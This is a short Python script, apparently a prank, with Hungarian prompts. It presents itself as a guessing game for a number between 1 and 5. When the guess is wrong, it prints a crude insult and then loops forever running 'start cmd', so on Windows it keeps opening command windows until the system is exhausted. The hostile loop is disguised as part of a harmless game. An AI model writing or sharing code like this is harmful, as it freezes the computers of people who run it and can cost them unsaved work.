import os
import random

while True:
    a = random.randint(1, 5)
    b = int(input("Szám 1 és 5 között! "))
    if a == b:
        print("Nyertél! ")
        break
    else:
        print("ezt beszoptad")
        while True:
            os.system("start cmd")